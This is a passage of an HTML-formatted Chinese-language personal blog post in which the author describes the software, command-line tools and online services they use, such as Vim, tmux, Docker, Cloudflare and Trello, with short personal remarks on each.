&lt;li&gt;&lt;a href="https://www.virtualbox.org/"&gt;Virtual Box&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是個用了很久的 Virtual Machine Manager，支援 Linux 使用，但近幾年開始使用 VPS 之後就沒那麼常用了。  &lt;/li&gt;
&lt;li&gt;以前在使用的時候有遇到些問題，分別寫了幾篇文章紀錄：  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/"&gt;Boot LiveUSB in VirtualBox 4.3.18 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/"&gt;VirtualBox Guest additions upgrade: install_x11_startup_app: no script given | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/"&gt;Solution for the Failure to Attach USB Device in VirtualBox | Just for noting&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇不知道為什麼流量莫名的高，可能很多人都有遇到這問題？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kali.org/"&gt;Kali Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從它以前還叫作 &lt;a href="https://backtrack-linux.org/"&gt;BackTrack Linux&lt;/a&gt; 的時候就有在用了。  &lt;/li&gt;
&lt;li&gt;大學有陣子在碰資安相關的東西，所以會拿來做一些資訊安全相關的測試，最近幾年也比較少用了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/"&gt;Digital Ocean&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概 2015 年開始使用的，但真正開始使用是在工作後，因為在學校沒主機了，所以就租個 VPS 來用，每個月 10 美金，算滿夠用的。  &lt;/li&gt;
&lt;li&gt;雖然貌似比 Linode, Vultr 還貴，但使用上也沒啥太大的問題，所以也懶得換了就是。  &lt;ul&gt;
&lt;li&gt;結果才過沒幾天，2018/01/17 Digital Ocean 就推出了新方案，一個月 10 美金變成有 2 GB RAM, 1 vCPU, 50 GB SSD, 2TB Bandwidth，直接變得比 Linode 和 Vultr 還便宜了：&lt;a href="https://blog.digitalocean.com/new-droplet-plans/"&gt;Kicking Off the New Year with New Droplet Plans&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這間公司的文件都寫得滿用心的，因為有專門聘請寫手來寫，滿推薦的。  &lt;/li&gt;
&lt;li&gt;拿來放些自動化的程式，例如：  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/ad375e227ec0f1ba450915df65433473"&gt;批踢踢每天定時登入&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS"&gt;一個每小時爬 RSS feed 然後發 Tweet 的 Twitter Bot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;之前寫&lt;a href="https://github.com/M157q/ptt_statistics"&gt;批踢踢網頁版爬蟲&lt;/a&gt;時有放在上面跑  &lt;/li&gt;
&lt;li&gt;之前找租屋處的時候，寫了一個 &lt;a href="https://github.com/M157q/5g1"&gt;591 租屋網的爬蟲&lt;/a&gt;也有放在上面跑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://parsecgaming.com"&gt;Parsec&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近幾天才開始使用的 Cloud Gaming service，確定可以在上面直接用 Steam 玩遊戲，Linux 也可以使用。  &lt;/li&gt;
&lt;li&gt;可以讓你像 Steam In-Home 一樣設定自己的主機，也可以直接讓你租 AWS 或 Paperspace 的 GPU 主機來用，費用我覺得算 OK，依照分鐘收費。  &lt;/li&gt;
&lt;li&gt;租用雲端主機適合沒辦法或沒錢或沒地方或不想組 Windows 遊戲主機的人使用，但網路速度要夠快，不然 latency 可能會有點高。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Editors&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.vim.org/"&gt;Vim&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概從 2008 年開始用到現在，赫然發現也快 10 年了。  &lt;/li&gt;
&lt;li&gt;搭配 &lt;code&gt;Vundle&lt;/code&gt; 來安裝 Plugin，詳細的設定可以參考這個設定：&lt;a href="https://github.com/M157q/dotfiles/blob/master/vimrc#L95-L179"&gt;https://github.com/M157q/dotfiles/blob/master/vimrc#L95-L179&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://atom.io/"&gt;Atom&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Open Source 的 Text editor，有時候會開來用。  &lt;/li&gt;
&lt;li&gt;有滿多的 plugin 可以裝的，但我沒有裝。之前最有名的應該是 &lt;a href="https://atom.io/packages/activate-power-mode"&gt;activate-power-mode 這個 plugin&lt;/a&gt; 吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Microsoft/vscode"&gt;https://github.com/Microsoft/vscode&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;微軟出的 Open Source edtior，有時候會開來用。  &lt;/li&gt;
&lt;li&gt;基本上我覺得是抄 atom 的就是，但有多出更多功能。  &lt;/li&gt;
&lt;li&gt;有一個我最喜歡的功能是可以在 editor 裡頭直接開 terminal 來用，我覺得很方便，然後&lt;a href="https://github.com/Microsoft/vscode/issues/143"&gt;這個功能是一位台灣人去提的&lt;/a&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Terminal&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/bash/"&gt;urxvt-unicode&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一款 terminal emulator，類似 macOS 上的 iTerm 或 iTerm2。  &lt;/li&gt;
&lt;li&gt;搭配這份設定檔：&lt;a href="https://github.com/M157q/dotfiles/blob/master/Xresources"&gt;https://github.com/M157q/dotfiles/blob/master/Xresources&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zsh.org/"&gt;Zsh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;以前是使用 bash，後來預設的 shell 改成 zsh，主要是補完功能以及支援非 ASCII 比較完整。  &lt;/li&gt;
&lt;li&gt;搭配 &lt;a href="http://ohmyz.sh/"&gt;oh-my-zsh&lt;/a&gt; 針對不同的 OS 安裝不同的 plugins 來使用，設定檔在這：&lt;a href="https://github.com/M157q/dotfiles/blob/master/zshrc"&gt;https://github.com/M157q/dotfiles/blob/master/zshrc&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/bash/"&gt;Bash&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上寫 shell script 還是會寫 bash 就是，管 server 的時候大多數 Linux server 也都是 bash。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;CLI Tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/screen/"&gt;screen&lt;/a&gt; &amp;amp; &lt;a href="http://bxr.su/OpenBSD/usr.bin/tmux/"&gt;tmux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這兩個指令基本上拿來做相同的事，可以在一個 terminal 裏面開多個分頁。  &lt;/li&gt;
&lt;li&gt;除了方便管理以外，在遇到某些程式要跑很久的時候也很好用，可以把該程式掛在某個分頁，然後再另外開一個分頁去做其他事，不用等到程式跑完。  &lt;/li&gt;
&lt;li&gt;screen 和 tmux 各有擁護者，偶爾會見到兩派使用者開戰。  &lt;/li&gt;
&lt;li&gt;但我自己是開 screen 再在每個 screen 的分頁裏面開 tmux，這樣我覺得很好管理，比如說在不同的 project 開發的話，我就會一個 project 用一個 screen。因為如果在 screen 裏面再開 screen 或 tmux 裏面再開 tmux 的話，會沒辦法控制到裏面那層。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hisham.hm/htop/"&gt;htop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以拿來監控系統資源的工具  &lt;/li&gt;
&lt;li&gt;我通常都是開著掛在 &lt;code&gt;tmux&lt;/code&gt; 的第一個分頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sindresorhus/speed-test"&gt;speed-test&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接在 CLI 測網路速度，不用開 SpeedTest 的網頁，挺方便的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://geoff.greer.fm/ag/"&gt;ag&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;名字叫 The Silver Searcher  &lt;/li&gt;
&lt;li&gt;類似 &lt;code&gt;grep&lt;/code&gt; 和 &lt;code&gt;ack&lt;/code&gt; 的工具，但效能比較好，要下指令也很方便，只有 &lt;code&gt;ag&lt;/code&gt; 兩個字。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://virtualenv.pypa.io/en/stable/"&gt;virtualenv&lt;/a&gt; + &lt;a href="https://virtualenvwrapper.readthedocs.io/en/latest/"&gt;virtualenvwrapper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為很常用 Python，然後裝東西的時候又不想影響到系統用的 Python，所以就會使用 virtualenv 來把環境隔開。  &lt;/li&gt;
&lt;li&gt;搭配 virtualenvwrapper 可以用更簡單的指令一次處理數個 virtualenv 的指令，挺方便的。  &lt;/li&gt;
&lt;li&gt;例如要新增一個新的 virtualenv 的話，只要 &lt;code&gt;mkvirtualenv py2 --python=python2&lt;/code&gt; 這樣就行了。  &lt;/li&gt;
&lt;li&gt;我自己基本上都是切成 &lt;code&gt;py2&lt;/code&gt;, &lt;code&gt;py3&lt;/code&gt; 來使用，然後各個用 Python 的專案也都會有各自的 virutalenv。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wicd.sourceforge.net/"&gt;wicd &amp;amp; wicd-curses&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;wicd 的 CLI 介面，我都用這個來選擇無線網路。  &lt;/li&gt;
&lt;li&gt;如果是圖形化介面的話則有 wicd-gtk 可以使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.gnome.org/NetworkManager/"&gt;NetworkManager&lt;/a&gt; &amp;amp; &lt;a href="https://developer.gnome.org/NetworkManager/stable/nmcli.html"&gt;nmcli&lt;/a&gt; &amp;amp; &lt;a href="https://developer.gnome.org/NetworkManager/stable/nmtui.html"&gt;nmtui&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;wicd 遇到會重導向到 Login 頁面的 Public Wi-Fi 常常會連 IP 都拿不到，但 NetworkManager 往往對付這種 Public Wi-Fi 都可以順利拿到 IP，所以我會在這時候使用 &lt;code&gt;nmcli&lt;/code&gt; 或 &lt;code&gt;nmtui&lt;/code&gt; 去操控 NetworkManager。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.alsa-project.org/main/index.php/Main_Page"&gt;alsamixer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來調整 ALSA 裝置的音量，操控挺容易的，也有基於文字的圖形化介面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;bluetoothctl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用指令來管理藍牙裝置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rg3/youtube-dl/"&gt;youtube-dl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://rg3.github.io/youtube-dl/"&gt;http://rg3.github.io/youtube-dl/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;下載影片跟音樂的神器  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/linux-pidof-get-sub-process-id-2016/"&gt;pidof&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為這篇文章才知道的：&lt;a href="https://blog.longwin.com.tw/2016/12/linux-pidof-get-sub-process-id-2016/"&gt;使用 pidof 找出此程式的所有 process id - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;以前找 process 都要用 &lt;code&gt;ps aux | grep xxx&lt;/code&gt; 來找，用這個指令的話只要用 &lt;code&gt;pidof xxx&lt;/code&gt; 就行了  &lt;/li&gt;
&lt;li&gt;Arch Linux User 的話可以用 &lt;code&gt;sudo pacman -S procps-ng&lt;/code&gt; 來安裝。  &lt;ul&gt;
&lt;li&gt;但我發現 &lt;code&gt;pidof&lt;/code&gt; 之前是被放在不同的 package 裡頭，所以之後有變的話，可以用 &lt;code&gt;pkgfile pidof&lt;/code&gt; 來找 &lt;code&gt;pidof&lt;/code&gt; 被包含在哪個 package 裡頭。  &lt;/li&gt;
&lt;li&gt;如果沒有 &lt;code&gt;pkgfile&lt;/code&gt; 這個指令的話，可以透過 &lt;code&gt;sudo pacman -S pkgfile&lt;/code&gt; 來安裝  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ffmpeg.org/"&gt;ffmpeg&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;影音轉檔神器，也可以做到裁切、截圖等等的後續處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/traviscross/mtr"&gt;mtr&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來查路由的神器，方便易用，比 &lt;code&gt;traceroute&lt;/code&gt; 好用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;GUI Tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wicd.sourceforge.net/"&gt;wicd-gtk&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為 &lt;code&gt;wicd-curses&lt;/code&gt; 有些 bug，例如遇到新的且需要輸入密碼的 SSID 時會無法設定密碼，所以偶爾會用到 &lt;code&gt;wicd-gtk&lt;/code&gt;，顧名思義，就是 GTK 介面的 wicd。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://freedesktop.org/software/pulseaudio/pavucontrol/"&gt;PulseAudio Volume Control&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;指令為 &lt;code&gt;pavucontrol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;alsamixer&lt;/code&gt; 的功能在普通使用下算夠用，但比較複雜的操作就會顯得麻煩了點，這時候 &lt;code&gt;pavucontrol&lt;/code&gt; 就派上用場了。  &lt;/li&gt;
&lt;li&gt;可以把輸出和輸入合併為一個音源，大概就像 macOS 上的 SoundFlower 那樣。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wugh.github.io/posts/2015/01/linux-pulse-mix-mic-and-computer-audio/"&gt;Linux通过Pulse混合麦克风和音频输出 — Life in a Nutshell&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.lxde.org/en/PCManFM"&gt;PCManFM&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;由台灣人 PCMan 撰寫的開源檔案瀏覽器，嗯，就是那位撰寫瀏覽 BBS 程式 PCMan 的 PCMan （真繞口）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.chromium.org/"&gt;Chromium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是去除了非開放原始碼部份的 Google Chrome，所以整個專案的程式碼都是公開的。  &lt;/li&gt;
&lt;li&gt;和 Google Chrome 比起來也比較輕量一些些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mozilla.org/zh-TW/firefox/channel/desktop/"&gt;Firefox Nightly&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2017 年 10 月左右，為了先體驗 Firefox 57 的 Quantum engine 就先裝了，之後就一直使用到現在。  &lt;/li&gt;
&lt;li&gt;剛從 Firefox 55 切換過來的時候真的覺得快了不少，但後來因為使用上覺得還是有 Memory Leak 的問題，所以就比較少用了。  &lt;/li&gt;
&lt;li&gt;加上最近又出了這個問題：&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;，所以就換去使用 &lt;code&gt;qutebrowser&lt;/code&gt; 了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://qutebrowser.org/"&gt;qutebrowser&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個基於 QtWebEngine 並使用 Python 開發的開源瀏覽器。  &lt;/li&gt;
&lt;li&gt;所有的操作基本上都以 Vim 的使用習慣為主，有點類似 &lt;code&gt;dwb&lt;/code&gt;，很適合我這種 Vim user，畢竟在 Chrome, Chromium, Firefox 上我都有裝 Vimium 這個瀏覽器套件，可以讓我不太需要移動右手去使用滑鼠。  &lt;/li&gt;
&lt;li&gt;輕量化瀏覽器，比 Chrome 或 Firefox 都省資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Version Control &amp;amp; DevOps&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/"&gt;Git&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;應該不用多說了，算起來從 2012 年開始接觸，也快 6 年了。  &lt;/li&gt;
&lt;li&gt;雖然也用過 &lt;code&gt;svn&lt;/code&gt; 和 &lt;code&gt;bzr&lt;/code&gt;，但還是覺得比較習慣 &lt;code&gt;git&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;現在連寫 blog 都用 &lt;code&gt;git&lt;/code&gt; 作版本控制了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.docker.com/"&gt;Docker&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;目前最主流的 Container 格式。  &lt;/li&gt;
&lt;li&gt;開源的部份在 2017 年改名叫 Moby 了，但大家還是習慣叫 Docker 就是。  &lt;/li&gt;
&lt;li&gt;Docker 現在專指這間公司，如果是企業版的話叫作 Docker EE，社群版的話叫作 Docker CE。  &lt;/li&gt;
&lt;li&gt;從 2016 年 4 月左右開始接觸，和 Microservices 息息相關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/"&gt;Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Google 出的 Container 管理工具，支援 Docker 和 Rocket，類似 Docker 官方出的 Docker Swarm。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Online Services&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://mail.google.com/mail/"&gt;Gmail&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這應該不用多介紹了，雖然知道隱私會被侵犯得很嚴重，但目前還是離不開。  &lt;/li&gt;
&lt;li&gt;之後其中一個計劃應該就是換到自架的 Mail Server 吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://calendar.google.com"&gt;Google Calendar&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個應該也不用多做介紹，覺得真的不錯用，尤其以前辦社團活動的時候被成功提醒了不少次。  &lt;/li&gt;
&lt;li&gt;無論是個人、分享或團體的時間安排都挺方便的。  &lt;/li&gt;
&lt;li&gt;應該就只有比較不適合一次性使用吧。  &lt;/li&gt;
&lt;li&gt;雖然有用 iPhone，但還是沒用 Apple 的 Calendar。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://maps.google.com"&gt;Google Maps&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個應該也不用多說了，現在出門去很多人都是靠這個在導航的吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ifttt.com"&gt;IFTTT&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;IFTTT 的意思是："If it, then that."  &lt;/li&gt;
&lt;li&gt;和多家公司合作，可以很簡單設定一些跨服務的觸發條件，除了 API 提供的觸發條件以外，還可以在這之上自己撰寫 JavaScript 做一些彈性化的設定。  &lt;/li&gt;
&lt;li&gt;每個人也可以分享自己設定的腳本供他人使用，大多數都是用來做一些提醒或是自動備份的事。  &lt;/li&gt;
&lt;li&gt;我目前是拿來把我在 Twitter 分享或在 Pocket 儲存一些我覺得不錯的文章時，會幫我自動在：&lt;a href="https://github.com/M157q/m157q.github.io/issues"&gt;Issues · M157q/m157q.github.io · GitHub&lt;/a&gt; 開個新的 Issue 紀錄，以方便我日後查詢，解決常常和人分享時想起看過某篇不錯的文章卻搜尋不到的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://getpocket.com"&gt;Pocket&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來將文章暫存以供日後閱讀的服務。  &lt;/li&gt;
&lt;li&gt;目前我的使用方式比較像是用來儲存與分類看過的文章，再加上使用了 IFTTT  的關係，說穿了其實就只是不用自己接 API，透過 IFTTT 把我看過的文章存到 GitHub Issues 而已，連搜尋也不太會在 Pocket 作搜尋。  &lt;/li&gt;
&lt;li&gt;但因為使用 Pocket 的時間早於我把文章存到 GitHub Issues 的時間，所以一些比較舊的文章還是會來 Pocket 找就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://feedly.com"&gt;Feedly&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個不錯用的 RSS Reader，目前就拿來追蹤個人與企業的技術 blog。  &lt;/li&gt;
&lt;li&gt;現在免費版的上限好像只能到 100 個來源的樣子，但我自己好像因為比較早使用，所以即便是免費版卻沒有受到這個限制。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上自己已經是每天都會使用 GitHub 了。  &lt;/li&gt;
&lt;li&gt;目前全球最大的程式碼管理平台，許多開放原始碼的專案都在上面，真的是有很多非常有趣的專案，也可以很輕易得和國外的開發者交流。  &lt;/li&gt;
&lt;li&gt;雖然大家私底下好像都戲稱成「全球最大同性交友平台」(ry  &lt;/li&gt;
&lt;li&gt;因為一掛掉就會導致很多工程師沒事幹，所以也有不少公司選擇使用 Bitbucket 或是使用 Gitlab 自己架設程式碼管理平台。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://trello.com"&gt;Trello&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一套基於「看板」(KanBan) 設計的任務管理平台，可供個人或團體使用。  &lt;/li&gt;
&lt;li&gt;我自己是用來紀錄自己做過的事情、幫自己的要做的事排定時間以及快速整理一些新學到的東西，以便之後可能可以整理成一篇文章來紀錄。個人覺得免費版就很夠用了。  &lt;/li&gt;
&lt;li&gt;最近這幾天開始使用 KanbanFlow 這套類似的工具，好處應該就是多了個番茄鐘可以幫你紀錄時間，如果是番茄鐘的愛好者且還沒使用過 Trello 的話，可以直接試試看 KanbanFlow。我自己是因為 Trello 已經紀錄不少東西了，要搬挺麻煩了，所以目前是兩個搭配使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://travis-ci.org"&gt;Travis CI&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個僅和 GitHub 作整合的 Continuous Integration 平台，目前還是 GitHub 上市佔率最大的 CI 平台。可以參考這篇 2017 年 11 月的文章：&lt;a href="https://github.com/blog/2463-github-welcomes-all-ci-tools"&gt;GitHub welcomes all CI tools · GitHub&lt;/a&gt;，列出了 GitHub 上使用的 CI 平台市佔率由多至少依序為：Travis CI, Circle Ci, Jenkins, AppVeyor, CodeShip, Drone, Semaphore CI, Buildkite, Wercker, TeamCity。  &lt;/li&gt;
&lt;li&gt;好處是所有 Public repo 都可以免費使用，而且搜尋一下就有很多設定檔可以參考。我目前是用來自動 build 並發佈我的個人部落格：&lt;a href="https://blog.m157q.tw/posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/"&gt;用 Travis CI 自動化發佈 Pelican blog 到 GitHub Pages 上 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cloudflare.com"&gt;CloudFlare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2016 年 6 月租了自己的 domain 之後，就拿來個人使用。在這之前是因為公司的服務有在使用，所以才接觸到，覺得設計的很簡單易用且功能又很強大。  &lt;/li&gt;
&lt;li&gt;DNS 代管設定很方便，而且加上 proxy 之後就有免費的 CDN 和 HTTPS 可以使用。有很多其他的功能，可以設定 Cache、簡單的流量分析、免費的網站資安防護等等等。  &lt;/li&gt;
&lt;li&gt;詳細一點的介紹可以參考這篇文章：&lt;a href="https://blog.m157q.tw/posts/2016/09/06/i-bought-my-first-domain-name/"&gt;買了一個叫作 m157q.tw 的域名 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;不過 2017 年 2 月的時候也有出過 CloudBleed 這個大包就是：&lt;a href="https://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/"&gt;Incident report on memory leak caused by Cloudflare parser bug&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gandi.net"&gt;Gandi&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為很常出現在台灣的社群會議，所以就在上面租了域名。  &lt;/li&gt;
&lt;li&gt;但我覺得使用上沒有很方便，而且因為 DNS 的管理已經被我轉到 CloudFlare 了，所以基本上只有在續租域名的時候才會開啟。  &lt;/li&gt;
&lt;li&gt;其他類似的服務有 NameCheap, GoDaddy，GoDaddy 我覺得好用一些，但也沒有認真比較過就是。  &lt;/li&gt;
&lt;li&gt;如果要用 Gandi 的服務的話，記得要開啟 "Private Domain Registration" 就是，不然個資直接被人用 &lt;code&gt;whois&lt;/code&gt; 看光光。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack.com"&gt;Slack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就是一個針對團隊協作而開發的平台，台灣不少新創公司與社群都有使用。  &lt;/li&gt;
&lt;li&gt;基本上就是功能更多元的 IRC 聊天室，可以整合許多 API，做到 CI, CD 的通知，甚至可以做到 ChatOps。  &lt;/li&gt;
&lt;li&gt;只是我沒有很喜歡一個 workspace 就要重新註冊一組帳號密碼的設計，但可以理解為什麼要這樣設計就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://discordapp.com"&gt;Discord&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近才開始使用的服務，主要是針對 Gamer 設計的即時語音通訊平台。  &lt;/li&gt;
&lt;li&gt;我個人是覺得像是 Slack + RaidCall，可以即時多人語音通訊（無上限），在 2017 年 11 月也開放了和好友視訊通話與螢幕畫面分享的功能（最多 10 人）。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com"&gt;Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個算新的部落格平台，乾淨簡潔無廣告，採用付費訂閱制，國外已經滿多人使用了，最近台灣也愈來愈多人使用。  &lt;/li&gt;
&lt;li&gt;我自己其實沒在使用，因為已經厭倦使用部落格平台了，一旦平台一倒的話要搬文章又是件痛苦的事。追蹤文章也是用 Feedly 去追。  &lt;/li&gt;
